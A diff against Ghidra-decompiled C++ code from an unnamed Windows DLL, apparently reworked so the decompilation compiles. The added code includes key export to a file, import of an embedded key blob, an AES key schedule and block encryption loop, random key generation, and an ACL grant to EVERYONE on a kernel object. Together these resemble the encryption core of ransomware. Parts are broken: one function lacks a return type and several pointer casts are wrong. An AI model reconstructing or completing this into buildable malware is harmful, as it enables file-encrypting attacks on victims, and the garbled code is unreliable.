@@ -1,4 +1,5 @@
 #define pointer32 void*
+#define local_unwind2 _local_unwind2
 
 #include <windows.h>
 #include <aclapi.h>
@@ -13,6 +14,7 @@
 #include <cstdint>
 #include <iostream>
 #include <string>
+#include <wincrypt.h>
 
 // 1. Tipos de datos propios de Ghidra
 typedef uint32_t undefined4;
@@ -358,7 +360,7 @@ union _ULARGE_INTEGER {
 
 typedef PVOID PSECURITY_DESCRIPTOR;
 
-typedef struct _ACL _ACL, *P_ACL;
+//typedef struct _ACL _ACL, *P_ACL;
 
 struct _ACL {
     BYTE AclRevision;
@@ -394,7 +396,7 @@ union _LARGE_INTEGER {
 
 typedef union _LARGE_INTEGER LARGE_INTEGER;
 
-typedef struct _ACL ACL;
+//typedef struct _ACL ACL;
 
 typedef ACL *PACL;
 
@@ -513,7 +515,7 @@ typedef struct HINSTANCE__ *HINSTANCE;
 
 typedef void *LPCVOID;
 
-typedef HINSTANCE HMODULE;
+//typedef HINSTANCE HMODULE;
 
 typedef HANDLE HLOCAL;
 
@@ -804,7 +806,7 @@ typedef enum _SE_OBJECT_TYPE {
     SE_PRINTER=3,
     SE_REGISTRY_KEY=4,
     SE_LMSHARE=5,
-    SE_KERNEL_OBJECT=6,
+    //SE_KERNEL_OBJECT=6,
     SE_WINDOW_OBJECT=7,
     SE_DS_OBJECT=8,
     SE_DS_OBJECT_ALL=9,
@@ -823,7 +825,7 @@ typedef enum _ACCESS_MODE {
     SET_AUDIT_FAILURE=6
 } _ACCESS_MODE;
 
-typedef struct _EXPLICIT_ACCESS_A _EXPLICIT_ACCESS_A, *P_EXPLICIT_ACCESS_A;
+//typedef struct _EXPLICIT_ACCESS_A _EXPLICIT_ACCESS_A, *P_EXPLICIT_ACCESS_A;
 
 typedef enum _ACCESS_MODE ACCESS_MODE;
 
@@ -862,7 +864,7 @@ struct _EXPLICIT_ACCESS_A {
     TRUSTEE_A Trustee;
 };
 
-typedef struct _EXPLICIT_ACCESS_A *PEXPLICIT_ACCESS_A;
+//typedef struct _EXPLICIT_ACCESS_A *PEXPLICIT_ACCESS_A;
 
 typedef enum _SE_OBJECT_TYPE SE_OBJECT_TYPE;
 
@@ -1166,11 +1168,14 @@ extern "C" {
     }
 }
 
-
+typedef int (__cdecl *DAT_1000d93c_fn)(uint32_t, int, int, int, int);
 
 extern "C" {
-    BOOL __cdecl FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3)
-    {
+    extern DAT_1000d93c_fn DAT_1000d93c;
+}
+
+extern "C" BOOL __cdecl FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3)
+{
         BOOL BVar1;
         DWORD DVar2;
         PROCESS_INFORMATION local_54 = { 0 };
@@ -1208,7 +1213,6 @@ extern "C" {
             return TRUE;
         }
         return FALSE;
-    }
 }
 
 
@@ -1309,8 +1313,8 @@ extern "C" {
 
         // Llamada a ConvertSidToStringSidW dinámicamente mediante casteo explícito de función
         typedef BOOL (WINAPI *pfnConvertSidToStringSidW)(PSID, LPWSTR*);
-        pfnConvertSidToStringSidW pConvertSidToStringSid = 
-    (pfnConvertSidToStringSidW)::GetProcAddress(reinterpret_cast<::HMODULE>(static_cast<void*>(hModule)), "ConvertSidToStringSidW");
+        pfnConvertSidToStringSidW pConvertSidToStringSid =
+    (pfnConvertSidToStringSidW)::GetProcAddress(hModule, "ConvertSidToStringSidW");
         if (pConvertSidToStringSid == nullptr) {
           GlobalFree(pTokenInformation);
           CloseHandle(hToken);
@@ -1444,7 +1448,12 @@ void __cdecl FUN_100013e0(HANDLE param_1)
   local_20.Trustee.TrusteeForm = static_cast<TRUSTEE_FORM>(TRUSTEE_IS_NAME);
   local_20.Trustee.TrusteeType = static_cast<TRUSTEE_TYPE>(TRUSTEE_IS_WELL_KNOWN_GROUP);
   local_20.Trustee.ptstrName = s_EVERYONE_1000c08c;
-  SetEntriesInAclA(1,&local_20,local_2c,&local_28);
+  SetEntriesInAclA(
+    1, 
+    static_cast<PEXPLICIT_ACCESS_A>(static_cast<void*>(&local_20)), 
+    local_2c, 
+    &local_28
+);
   SetSecurityInfo(param_1,SE_KERNEL_OBJECT,4,(PSID)0x0,(PSID)0x0,local_28,(PACL)0x0);
   LocalFree(local_2c);
   LocalFree(local_28);
@@ -1463,11 +1472,11 @@ char *__cdecl FUN_100014a0(char *param_1)
   int iVar4;
   WCHAR *pWVar5;
   unsigned int uVar6;
-  undefined4 *puVar7;
+  DWORD *puVar7;
   unsigned int uVar8;
   DWORD local_194;
   WCHAR local_190;
-  undefined4 local_18e [99];
+  DWORD local_18e [99];
   
   local_190 = DAT_1000d918;
   puVar7 = local_18e;
@@ -1590,8 +1599,22 @@ extern "C" {
     }
 }
 
+void __fastcall FUN_10005db0(uint32_t *param_1)
+
+{
+  *param_1 = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(&PTR_FUN_1000acbc));
+  return;
+}
 
 extern "C" {
+
+  void __fastcall FUN_10003a60(uint32_t *param_1)
+
+{
+  *param_1 = static_cast<uint32_t>(reinterpret_cast<uintptr_t>(&PTR_FUN_1000720c));
+  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
+  return;
+}
 
 void __fastcall FUN_10001680(uint32_t* param_1)
 {
@@ -1660,7 +1683,31 @@ void __fastcall FUN_10001680(uint32_t* param_1)
     #endif
 #endif
 
+typedef void (__cdecl *DAT_1000d944_fn)(int);
+
 extern "C" {
+    extern DAT_1000d944_fn DAT_1000d944;
+}
+
+extern "C" {
+
+  uint32_t __fastcall FUN_10003bb0(uint32_t param_1)
+
+{
+  if (*(int *)(param_1 + 8) != 0) {
+    (*DAT_1000d944)(*(int *)(param_1 + 8));
+    *(uint32_t *)(param_1 + 8) = 0;
+  }
+  if (*(int *)(param_1 + 0xc) != 0) {
+    (*DAT_1000d944)(*(int *)(param_1 + 0xc));
+    *(uint32_t *)(param_1 + 0xc) = 0;
+  }
+  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
+    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
+    *(uint32_t *)(param_1 + 4) = 0;
+  }
+  return 1;
+}
 
 uint32_t __fastcall FUN_10001760(uintptr_t param_1)
 {
@@ -1669,8 +1716,8 @@ uint32_t __fastcall FUN_10001760(uintptr_t param_1)
     int iVar3;
 
     // Aritmética de direcciones en bytes
-    FUN_10003bb0(reinterpret_cast<uint32_t*>(param_1 + 4));
-    FUN_10003bb0(reinterpret_cast<uint32_t*>(param_1 + 0x2C));
+    FUN_10003bb0((uint32_t)(param_1 + 4));
+FUN_10003bb0((uint32_t)(param_1 + 0x2C));
 
     // Primer búfer a limpiar con GlobalFree
     puVar1 = *reinterpret_cast<unsigned char**>(param_1 + 0x4C8);
@@ -1729,9 +1776,166 @@ uint32_t __fastcall FUN_10001760(uintptr_t param_1)
 
 } // extern "C"
 
+extern "C" void __cdecl _local_unwind2(void* frame, int target_level) {
+    // Stub para compatibilidad de descompilación SEH
+}
 
+uint32_t __cdecl FUN_10004040(uint32_t param_1,HCRYPTKEY param_2,DWORD param_3,LPCSTR param_4)
 
-undefined4 __thiscall FUN_10001830(void *self,LPCSTR param_1,undefined4 param_2,undefined4 param_3)
+{
+  BOOL BVar1;
+  BYTE *pbData;
+  HANDLE hFile;
+  DWORD local_28;
+  BYTE *local_24;
+  DWORD local_20 [3];
+  void *local_14;
+  undefined *puStack_10;
+  undefined *puStack_c;
+  uint32_t local_8;
+  
+  puStack_c = &DAT_10007230;
+  puStack_10 = &DAT_10006bb6;
+  local_14 = ExceptionList;
+  local_28 = 0;
+  local_20[0] = 0;
+  local_24 = (BYTE *)0x0;
+  local_8 = 0;
+  ExceptionList = &local_14;
+  BVar1 = CryptExportKey(param_2,0,param_3,0,(BYTE *)0x0,&local_28);
+  if ((((BVar1 != 0) && (pbData = GlobalAlloc(0,local_28), local_24 = pbData, pbData != (BYTE *)0x0)
+       ) && (BVar1 = CryptExportKey(param_2,0,param_3,0,pbData,&local_28), BVar1 != 0)) &&
+     ((hFile = CreateFileA(param_4,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
+      hFile != (HANDLE)0xffffffff &&
+      (BVar1 = WriteFile(hFile,pbData,local_28,local_20,(LPOVERLAPPED)0x0), BVar1 != 0)))) {
+    local_unwind2(&local_14,0xffffffff);
+    ExceptionList = local_14;
+    return 1;
+  }
+  local_unwind2(&local_14,0xffffffff);
+  ExceptionList = local_14;
+  return 0;
+}
+
+uint32_t __fastcall FUN_10003a80(uint32_t param_1)
+
+{
+  int iVar1;
+  int iVar2;
+  
+  iVar2 = 0;
+  do {
+    iVar1 = (*DAT_1000d93c)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x1000d168,0x18,0xf0000000);
+    if (iVar1 != 0) {
+      return 1;
+    }
+    iVar2 = iVar2 + 1;
+  } while (iVar2 < 2);
+  return 0;
+}
+
+uint32_t __cdecl FUN_10003f00(uint32_t param_1,uint32_t param_2,LPCSTR param_3)
+
+{
+  HANDLE hFile;
+  DWORD dwBytes;
+  HGLOBAL lpBuffer;
+  BOOL BVar1;
+  int iVar2;
+  DWORD local_20 [3];
+  void *local_14;
+  undefined *puStack_10;
+  undefined *puStack_c;
+  uint32_t local_8;
+  
+  puStack_c = &DAT_10007220;
+  puStack_10 = &DAT_10006bb6;
+  local_14 = ExceptionList;
+  local_20[0] = 0;
+  local_8 = 0;
+  ExceptionList = &local_14;
+  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
+  if ((((hFile != (HANDLE)0xffffffff) &&
+       (dwBytes = GetFileSize(hFile,(LPDWORD)0x0), dwBytes != 0xffffffff)) && (dwBytes < 0x19001))
+     && (((lpBuffer = GlobalAlloc(0,dwBytes), lpBuffer != (HGLOBAL)0x0 &&
+          (BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0), BVar1 != 0)) &&
+         (iVar2 = (*DAT_1000d940)(param_1,lpBuffer,local_20[0],0,0,param_2), iVar2 != 0)))) {
+    local_unwind2(&local_14,0xffffffff);
+    ExceptionList = local_14;
+    return 1;
+  }
+  local_unwind2(&local_14,0xffffffff);
+  ExceptionList = local_14;
+  return 0;
+}
+
+void __thiscall FUN_10003c00(void *this,LPCSTR param_1)
+
+{
+  if (*(int *)((int)this + 8) != 0) {
+    (*DAT_1000d944)(*(int *)((int)this + 8));
+    *(undefined4 *)((int)this + 8) = 0;
+  }
+  FUN_10003f00(*(undefined4 *)((int)this + 4),(undefined4 *)((int)this + 8),param_1);
+  return;
+}
+
+bool __cdecl FUN_10004350(uint32_t param_1,uint32_t param_2)
+
+{
+  int iVar1;
+  
+  iVar1 = (*DAT_1000d950)(param_1,1,0x8000001,param_2);
+  return iVar1 != 0;
+}
+
+uint32_t __thiscall FUN_10003ac0(void *this,LPCSTR param_1,LPCSTR param_2)
+
+{
+  bool bVar1;
+  int iVar2;
+  undefined3 extraout_var;
+  
+  iVar2 = FUN_10003a80((int)this);
+  if (iVar2 == 0) {
+    FUN_10003bb0((int)this);
+    return 0;
+  }
+  if (param_1 == (LPCSTR)0x0) {
+    iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)this + 4),&DAT_1000d054,0x114,0,0,(int)this + 8);
+    if (iVar2 == 0) {
+      FUN_10003bb0((int)this);
+      return 0;
+    }
+  }
+  else {
+    iVar2 = FUN_10003c00(this,param_1);
+    if (iVar2 == 0) {
+      iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)this + 4),&DAT_1000cf40,0x114,0,0,(int)this + 0xc
+                             );
+      if (iVar2 == 0) {
+LAB_10003b86:
+        FUN_10003bb0((int)this);
+        return 0;
+      }
+      bVar1 = FUN_10004350(*(undefined4 *)((int)this + 4),(HCRYPTKEY *)((int)this + 8));
+      if (CONCAT31(extraout_var,bVar1) == 0) goto LAB_10003b86;
+      iVar2 = FUN_10004040(*(undefined4 *)((int)this + 4),*(HCRYPTKEY *)((int)this + 8),6,param_1);
+      if (iVar2 == 0) goto LAB_10003b86;
+      if (param_2 != (LPCSTR)0x0) {
+        FUN_10003c40(param_2);
+      }
+      iVar2 = FUN_10003c00(this,param_1);
+      if (iVar2 == 0) goto LAB_10003b86;
+    }
+    if (*(int *)((int)this + 0xc) != 0) {
+      (*DAT_1000d944)(*(int *)((int)this + 0xc));
+    }
+  }
+  return 1;
+}
+
+   uint32_t __cdecl FUN_10001830(void *self,LPCSTR param_1, uint32_t param_2, uint32_t param_3)
 
 {
   int iVar1;
@@ -1792,7 +1996,408 @@ void __thiscall FUN_10001910(void *this,wchar_t *param_1)
   return;
 }
 
+void __thiscall FUN_10004420(void *this,BYTE *param_1,DWORD param_2)
 
+{
+  CryptGenRandom(*(HCRYPTPROV *)((int)this + 4),param_2,param_1);
+  return;
+}
+
+FUN_10004370(void *this,BYTE *param_1,DWORD param_2,BYTE *param_3,undefined4 *param_4)
+
+{
+  LPCRITICAL_SECTION lpCriticalSection;
+  BYTE *pBVar1;
+  uint32_t *puVar2;
+  int iVar3;
+  unsigned int uVar4;
+  BYTE *pBVar5;
+  uint32_t uVar6;
+  
+  if (*(int *)((int)this + 8) == 0) {
+    return 0;
+  }
+  iVar3 = FUN_10004420(this,param_1,param_2);
+  pBVar1 = param_3;
+  if (iVar3 == 0) {
+    return 0;
+  }
+  if ((param_3 != (BYTE *)0x0) && (param_4 != (undefined4 *)0x0)) {
+    pBVar5 = param_3;
+    for (uVar4 = param_2 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
+      *(undefined4 *)pBVar5 = *(undefined4 *)param_1;
+      param_1 = param_1 + 4;
+      pBVar5 = pBVar5 + 4;
+    }
+    for (uVar4 = param_2 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
+      *pBVar5 = *param_1;
+      param_1 = param_1 + 1;
+      pBVar5 = pBVar5 + 1;
+    }
+    lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
+    EnterCriticalSection(lpCriticalSection);
+    puVar2 = param_4;
+    uVar6 = *param_4;
+    iVar3 = (*DAT_1000d948)(*(undefined4 *)((int)this + 8),0,1,0,pBVar1,&param_2);
+    if (iVar3 == 0) {
+      LeaveCriticalSection(lpCriticalSection);
+      return 0;
+    }
+    LeaveCriticalSection(lpCriticalSection);
+    *puVar2 = uVar6;
+  }
+  return 1;
+}
+
+void __thiscall FUN_10005dc0(void *this,byte *param_1,byte *param_2,int param_3,uint param_4)
+
+{
+  byte bVar1;
+  uint32_t uVar2;
+  int iVar3;
+  uint *puVar4;
+  uint uVar5;
+  uint uVar6;
+  int iVar7;
+  byte *pbVar8;
+  int iVar9;
+  int iVar10;
+  byte *pbVar11;
+  uint32_t *puVar12;
+  int iVar13;
+  uint *puVar14;
+  uint32_t *puVar15;
+  exception local_c [12];
+  
+  if (param_1 == (byte *)0x0) {
+    param_1 = &DAT_1000d8d8;
+    exception::exception(local_c,(char **)&param_1);
+                    // WARNING: Subroutine does not return
+    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+  }
+  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
+    param_1 = &DAT_1000d8d8;
+    exception::exception(local_c,(char **)&param_1);
+                    // WARNING: Subroutine does not return
+    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+  }
+  if (((param_4 != 0x10) && (param_4 != 0x18)) && (param_4 != 0x20)) {
+    param_1 = &DAT_1000d8d8;
+    exception::exception(local_c,(char **)&param_1);
+                    // WARNING: Subroutine does not return
+    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+  }
+  *(int *)((int)this + 0x3c8) = param_3;
+  *(uint *)((int)this + 0x3cc) = param_4;
+  pbVar8 = param_2;
+  pbVar11 = (byte *)((int)this + 0x3d0);
+  for (uVar5 = param_4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
+    *(undefined4 *)pbVar11 = *(undefined4 *)pbVar8;
+    pbVar8 = pbVar8 + 4;
+    pbVar11 = pbVar11 + 4;
+  }
+  for (uVar5 = param_4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
+    *pbVar11 = *pbVar8;
+    pbVar8 = pbVar8 + 1;
+    pbVar11 = pbVar11 + 1;
+  }
+  uVar5 = *(uint *)((int)this + 0x3cc);
+  pbVar8 = (byte *)((int)this + 0x3f0);
+  for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
+    *(undefined4 *)pbVar8 = *(undefined4 *)param_2;
+    param_2 = param_2 + 4;
+    pbVar8 = pbVar8 + 4;
+  }
+  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
+    *pbVar8 = *param_2;
+    param_2 = param_2 + 1;
+    pbVar8 = pbVar8 + 1;
+  }
+  if (*(int *)((int)this + 0x3c8) == 0x10) {
+    if (*(int *)((int)this + 0x3cc) == 0x10) {
+      iVar7 = 10;
+    }
+    else {
+      iVar7 = (-(uint)(*(int *)((int)this + 0x3cc) != 0x18) & 2) + 0xc;
+    }
+    *(int *)((int)this + 0x410) = iVar7;
+  }
+  else if (*(int *)((int)this + 0x3c8) == 0x18) {
+    *(uint *)((int)this + 0x410) = (-(uint)(*(int *)((int)this + 0x3cc) != 0x20) & 0xfffffffe) + 0xe
+    ;
+  }
+  else {
+    *(undefined4 *)((int)this + 0x410) = 0xe;
+  }
+  iVar9 = 0;
+  iVar7 = (int)(*(int *)((int)this + 0x3cc) + (*(int *)((int)this + 0x3cc) >> 0x1f & 3U)) >> 2;
+  if (-1 < *(int *)((int)this + 0x410)) {
+    puVar12 = (undefined4 *)((int)this + 8);
+    do {
+      iVar13 = iVar7;
+      puVar15 = puVar12;
+      if (0 < iVar7) {
+        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
+          *puVar15 = 0;
+          puVar15 = puVar15 + 1;
+        }
+      }
+      iVar9 = iVar9 + 1;
+      puVar12 = puVar12 + 8;
+    } while (iVar9 <= *(int *)((int)this + 0x410));
+  }
+  iVar9 = 0;
+  if (-1 < *(int *)((int)this + 0x410)) {
+    puVar12 = (undefined4 *)((int)this + 0x1e8);
+    do {
+      iVar13 = iVar7;
+      puVar15 = puVar12;
+      if (0 < iVar7) {
+        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
+          *puVar15 = 0;
+          puVar15 = puVar15 + 1;
+        }
+      }
+      iVar9 = iVar9 + 1;
+      puVar12 = puVar12 + 8;
+    } while (iVar9 <= *(int *)((int)this + 0x410));
+  }
+  puVar4 = (uint *)((int)this + 0x414);
+  iVar9 = (*(int *)((int)this + 0x410) + 1) * iVar7;
+  pbVar11 = (byte *)((int)(*(int *)((int)this + 0x3c8) + (*(int *)((int)this + 0x3c8) >> 0x1f & 3U))
+                    >> 2);
+  pbVar8 = param_1;
+  param_1 = pbVar11;
+  if (0 < (int)pbVar11) {
+    do {
+      *puVar4 = (uint)*pbVar8 << 0x18;
+      *puVar4 = *puVar4 | (uint)pbVar8[1] << 0x10;
+      *puVar4 = *puVar4 | (uint)pbVar8[2] << 8;
+      *puVar4 = *puVar4 | (uint)pbVar8[3];
+      param_1 = param_1 + -1;
+      pbVar8 = pbVar8 + 4;
+      puVar4 = puVar4 + 1;
+    } while (param_1 != (byte *)0x0);
+  }
+  iVar13 = 0;
+  if (0 < (int)pbVar11) {
+    param_1 = (byte *)((int)this + 0x414);
+    do {
+      if (iVar9 <= iVar13) goto LAB_100061e6;
+      iVar3 = iVar13 / iVar7;
+      iVar10 = iVar13 % iVar7;
+      *(undefined4 *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *(undefined4 *)param_1;
+      iVar13 = iVar13 + 1;
+      uVar2 = *(undefined4 *)param_1;
+      param_1 = param_1 + 4;
+      *(undefined4 *)((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8)
+           = uVar2;
+    } while (iVar13 < (int)pbVar11);
+  }
+  if (iVar13 < iVar9) {
+    param_2 = &DAT_1000ac3c;
+    do {
+      uVar5 = *(uint *)((int)this + (int)pbVar11 * 4 + 0x410);
+      bVar1 = *param_2;
+      param_2 = param_2 + 1;
+      *(uint *)((int)this + 0x414) =
+           *(uint *)((int)this + 0x414) ^
+           CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x10 & 0xff] ^ bVar1,
+                                      (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),
+                             (&DAT_10007a3c)[uVar5 & 0xff]),(&DAT_10007a3c)[uVar5 >> 0x18]);
+      if (pbVar11 == (byte *)0x8) {
+        puVar4 = (uint *)((int)this + 0x418);
+        iVar3 = 3;
+        do {
+          *puVar4 = *puVar4 ^ puVar4[-1];
+          puVar4 = puVar4 + 1;
+          iVar3 = iVar3 + -1;
+        } while (iVar3 != 0);
+        uVar5 = *(uint *)((int)this + 0x420);
+        iVar3 = 3;
+        *(uint *)((int)this + 0x424) =
+             *(uint *)((int)this + 0x424) ^
+             CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x18],
+                                        (&DAT_10007a3c)[uVar5 >> 0x10 & 0xff]),
+                               (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),(&DAT_10007a3c)[uVar5 & 0xff]);
+        puVar4 = (uint *)((int)this + 0x428);
+        do {
+          *puVar4 = *puVar4 ^ puVar4[-1];
+          puVar4 = puVar4 + 1;
+          iVar3 = iVar3 + -1;
+        } while (iVar3 != 0);
+      }
+      else if (1 < (int)pbVar11) {
+        puVar4 = (uint *)((int)this + 0x418);
+        pbVar8 = pbVar11 + -1;
+        do {
+          *puVar4 = *puVar4 ^ puVar4[-1];
+          puVar4 = puVar4 + 1;
+          pbVar8 = pbVar8 + -1;
+        } while (pbVar8 != (byte *)0x0);
+      }
+      param_1 = (byte *)0x0;
+      if (0 < (int)pbVar11) {
+        puVar12 = (undefined4 *)((int)this + 0x414);
+        do {
+          if (iVar9 <= iVar13) goto LAB_100061e6;
+          iVar3 = iVar13 / iVar7;
+          iVar10 = iVar13 % iVar7;
+          *(undefined4 *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *puVar12;
+          param_1 = param_1 + 1;
+          iVar13 = iVar13 + 1;
+          *(undefined4 *)
+           ((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8) = *puVar12
+          ;
+          puVar12 = puVar12 + 1;
+        } while ((int)param_1 < (int)pbVar11);
+      }
+    } while (iVar13 < iVar9);
+  }
+LAB_100061e6:
+  param_4 = 1;
+  if (1 < *(int *)((int)this + 0x410)) {
+    puVar4 = (uint *)((int)this + 0x208);
+    do {
+      puVar14 = puVar4;
+      iVar9 = iVar7;
+      if (0 < iVar7) {
+        do {
+          uVar5 = *puVar14;
+          iVar9 = iVar9 + -1;
+          *puVar14 = *(uint *)(&DAT_10009c3c + (uVar5 >> 0x18) * 4) ^
+                     *(uint *)(&DAT_1000a03c + (uVar5 >> 0x10 & 0xff) * 4) ^
+                     *(uint *)(&DAT_1000a43c + (uVar5 >> 8 & 0xff) * 4) ^
+                     *(uint *)(&DAT_1000a83c + (uVar5 & 0xff) * 4);
+          puVar14 = puVar14 + 1;
+        } while (iVar9 != 0);
+      }
+      param_4 = param_4 + 1;
+      puVar4 = puVar4 + 8;
+    } while ((int)param_4 < *(int *)((int)this + 0x410));
+  }
+  *(undefined1 *)((int)this + 4) = 1;
+  return;
+}
+
+void __thiscall FUN_10006940(void *this,uint *param_1,uint *param_2,uint param_3,uint param_4)
+
+{
+  uint *puVar1;
+  uint *puVar2;
+  uint uVar3;
+  uint uVar4;
+  int iVar5;
+  uint *puVar6;
+  bool bVar7;
+  exception local_c [12];
+  
+  if (*(char *)((int)this + 4) == '\0') {
+    exception::exception(local_c,&PTR_DAT_1000d8cc);
+                    // WARNING: Subroutine does not return
+    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+  }
+  if ((param_3 != 0) && (uVar4 = *(uint *)((int)this + 0x3cc), param_3 % uVar4 == 0)) {
+    if (param_4 == 1) {
+      param_4 = 0;
+      if (param_3 / uVar4 != 0) {
+        puVar2 = (uint *)((int)this + 0x3f0);
+        do {
+          if (*(char *)((int)this + 4) == '\0') {
+            exception::exception(local_c,&PTR_DAT_1000d8cc);
+                    // WARNING: Subroutine does not return
+            _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+          }
+          iVar5 = 0;
+          if (0 < (int)uVar4) {
+            puVar1 = puVar2;
+            do {
+              *(byte *)puVar1 =
+                   (byte)*puVar1 ^ *(byte *)(((int)param_1 - (int)puVar2) + (int)puVar1);
+              puVar1 = (uint *)((int)puVar1 + 1);
+              iVar5 = iVar5 + 1;
+            } while (iVar5 < *(int *)((int)this + 0x3cc));
+          }
+          FUN_10006640(this,puVar2,(byte *)param_2);
+          uVar4 = *(uint *)((int)this + 0x3cc);
+          puVar1 = param_2;
+          puVar6 = puVar2;
+          for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
+            *puVar6 = *puVar1;
+            puVar1 = puVar1 + 1;
+            puVar6 = puVar6 + 1;
+          }
+          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
+            *(char *)puVar6 = (char)*puVar1;
+            puVar1 = (uint *)((int)puVar1 + 1);
+            puVar6 = (uint *)((int)puVar6 + 1);
+          }
+          uVar4 = *(uint *)((int)this + 0x3cc);
+          param_1 = (uint *)((int)param_1 + uVar4);
+          param_2 = (uint *)((int)param_2 + uVar4);
+          param_4 = param_4 + 1;
+        } while (param_4 < param_3 / uVar4);
+      }
+    }
+    else {
+      bVar7 = param_4 == 2;
+      param_4 = 0;
+      if (bVar7) {
+        if (param_3 / uVar4 != 0) {
+          do {
+            FUN_10006640(this,(uint *)((int)this + 0x3f0),(byte *)param_2);
+            if (*(char *)((int)this + 4) == '\0') {
+              exception::exception(local_c,&PTR_DAT_1000d8cc);
+                    // WARNING: Subroutine does not return
+              _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+            }
+            iVar5 = 0;
+            puVar2 = param_2;
+            if (0 < *(int *)((int)this + 0x3cc)) {
+              do {
+                *(byte *)puVar2 = (byte)*puVar2 ^ *(byte *)(iVar5 + (int)param_1);
+                puVar2 = (uint *)((int)puVar2 + 1);
+                iVar5 = iVar5 + 1;
+              } while (iVar5 < *(int *)((int)this + 0x3cc));
+            }
+            uVar4 = *(uint *)((int)this + 0x3cc);
+            puVar2 = param_2;
+            puVar1 = (uint *)((int)this + 0x3f0);
+            for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
+              *puVar1 = *puVar2;
+              puVar2 = puVar2 + 1;
+              puVar1 = puVar1 + 1;
+            }
+            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
+              *(byte *)puVar1 = (byte)*puVar2;
+              puVar2 = (uint *)((int)puVar2 + 1);
+              puVar1 = (uint *)((int)puVar1 + 1);
+            }
+            uVar4 = *(uint *)((int)this + 0x3cc);
+            param_1 = (uint *)((int)param_1 + uVar4);
+            param_2 = (uint *)((int)param_2 + uVar4);
+            param_4 = param_4 + 1;
+          } while (param_4 < param_3 / uVar4);
+          return;
+        }
+      }
+      else if (param_3 / uVar4 != 0) {
+        do {
+          FUN_10006640(this,param_1,(byte *)param_2);
+          uVar4 = *(uint *)((int)this + 0x3cc);
+          param_1 = (uint *)((int)param_1 + uVar4);
+          param_2 = (uint *)((int)param_2 + uVar4);
+          param_4 = param_4 + 1;
+        } while (param_4 < param_3 / uVar4);
+        return;
+      }
+    }
+    return;
+  }
+  exception::exception(local_c,&PTR_DAT_1000d8d0);
+                    // WARNING: Subroutine does not return
+  _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
+}
 
 int __thiscall FUN_10001960(void *this,undefined4 param_1,LPCWSTR param_2,uint param_3)
 
@@ -1804,17 +2409,17 @@ int __thiscall FUN_10001960(void *this,undefined4 param_1,LPCWSTR param_2,uint p
   int iVar5;
   unsigned int uVar6;
   int *piVar7;
-  undefined4 uVar8;
+  uint32_t uVar8;
   int *piVar9;
   undefined4 *puVar10;
   HANDLE hFile;
   bool bVar11;
-  uint local_758;
+  unsigned int local_758;
   undefined1 local_754 [512];
   BYTE local_554 [512];
   HANDLE local_354;
-  undefined4 local_350;
-  undefined4 local_34c;
+  uint32_t local_350;
+  uint32_t local_34c;
   unsigned int local_348;
   HANDLE local_344;
   _FILETIME local_340;
@@ -1824,7 +2429,7 @@ int __thiscall FUN_10001960(void *this,undefined4 param_1,LPCWSTR param_2,uint p
   undefined2 local_323;
   undefined1 local_321;
   LARGE_INTEGER local_320;
-  undefined4 local_318;
+  uint32_t local_318;
   byte local_314 [16];
   void *local_304;
   unsigned int local_300;
@@ -1832,12 +2437,12 @@ int __thiscall FUN_10001960(void *this,undefined4 param_1,LPCWSTR param_2,uint p
   unsigned int local_2f8;
   unsigned int local_2f4;
   wchar_t local_2f0;
-  undefined4 local_2ee [179];
+  uint32_t local_2ee [179];
   int local_20;
   void *local_14;
   undefined *puStack_10;
   undefined *puStack_c;
-  undefined4 local_8;
+  uint32_t local_8;
   
   puStack_c = &DAT_10007200;
   puStack_10 = &DAT_10006bb6;
@@ -3367,118 +3972,6 @@ undefined4 * __thiscall FUN_10003a40(void *this,byte param_1)
   return this;
 }
 
-
-
-void __fastcall FUN_10003a60(undefined4 *param_1)
-
-{
-  *param_1 = &PTR_FUN_1000720c;
-  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
-  return;
-}
-
-
-
-undefined4 __fastcall FUN_10003a80(int param_1)
-
